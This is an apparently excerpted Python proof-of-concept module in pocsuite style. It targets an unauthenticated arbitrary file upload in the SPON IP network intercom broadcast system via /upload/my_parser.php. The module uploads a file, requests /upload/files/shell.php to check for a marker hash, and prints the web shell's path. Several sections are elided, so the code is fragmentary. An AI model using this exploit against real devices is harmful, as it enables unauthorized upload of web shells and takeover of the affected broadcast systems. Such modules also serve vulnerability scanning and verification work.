...
class POC(POCBase):
    ...
    name = 'SPON IP网络对讲广播系统 addscenedata.php 任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'IP网络对讲广播系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        世邦通信股份有限公司SPON IP网络对讲广播系统 /upload/my_parser.php 页面存在任意文件上传漏洞  
        未授权上传页面：http://x.x.x.x/upload/upload.html
    '''
...
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--'''
        try:
            ...
            resq_results=requests.get(url=self.url+'/upload/files/shell.php')
            if "e165421110ba03099a1c0393373c5b43" in resq_results.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = path
                result['VerifyInfo']['path'] = self.url+'/upload/files/shell.php'
...
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--'''
        try:
            ...
            t = resq.text
            t = t.replace('\n', '').replace('\r', '')
            print('File Path >>> ' + f'{self.url}/upload/files/shell.php')
            t = t.replace(" ", "")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
